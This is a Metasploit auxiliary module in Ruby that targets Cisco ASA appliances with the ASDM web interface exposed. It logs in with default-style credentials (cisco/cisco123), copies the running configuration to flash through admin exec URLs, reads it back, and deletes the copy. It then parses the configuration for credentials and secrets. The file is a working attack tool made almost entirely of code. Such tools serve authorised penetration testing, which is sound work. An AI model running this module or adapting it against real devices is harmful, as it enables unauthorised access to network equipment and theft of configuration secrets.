##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Cisco
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Cisco ASA ASDM Running Config Collector',
        'Description' => %q{
          This module gathers the running configration from a Cisco ASA with the ASDM web interface exposed.
        },
        'Author' => [
          'jbaines-r7'
        ],
        'References' => [
          [ 'URL', 'https://www.cisco.com/c/en/us/products/security/adaptive-security-device-manager/index.html' ]
        ],
        'License' => MSF_LICENSE,
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [true, 'The HTTP username to specify for basic authentication', 'cisco']),
        OptString.new('PASSWORD', [true, 'The HTTP password to specify for basic authentication', 'cisco123'])
      ]
    )
  end

  def run_host(_ip)
    # Establish the remote host is running Cisco ASDM
    res = send_request_cgi('uri' => normalize_uri('/admin/public/index.html'))
    return unless res && res.code == 200 && res.body.include?('<title>Cisco ASDM ')

    print_status('Copying the running-config to flash:/config')
    res = send_request_cgi({
      'uri' => normalize_uri('/admin/exec/copy+%2Fnoconfirm+running-config+flash%3A%2Fconfig'),
      'agent' => 'ASDM/ Java/1.8.0_333',
      'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
    })
    fail_with(Failure::TimeoutExpired, 'No reply received') unless res
    fail_with(Failure::BadConfig, 'Invalid login credentials') if res.code == 401
    fail_with(Failure::UnexpectedReply, "The server responded with #{res.code}") unless res.code == 200

    print_status('Reading the running-config')
    res = send_request_cgi({
      'uri' => normalize_uri('/admin/exec/more+flash%3A%2Fconfig'),
      'agent' => 'ASDM/ Java/1.8.0_333',
      'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
    })
    fail_with(Failure::TimeoutExpired, 'No reply received') unless res
    fail_with(Failure::BadConfig, 'Invalid login credentials') if res.code == 401
    fail_with(Failure::UnexpectedReply, "The server responded with #{res.code}") unless res.code == 200
    fail_with(Failure::Failure::Unknown, 'The server provided an empty bdoy') if res.body.empty?
    running_config = res.body

    print_status('Deleting flash:/config')
    send_request_cgi({
      'uri' => normalize_uri('/admin/exec/delete+%2Fnoconfirm+flash%3A%2Fconfig'),
      'agent' => 'ASDM/ Java/1.8.0_333',
      'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
    })

    print_good("#{rhost}:#{rport} Processing the configuration file...")
    cisco_ios_config_eater(rhost, rport, running_config)
  end
end
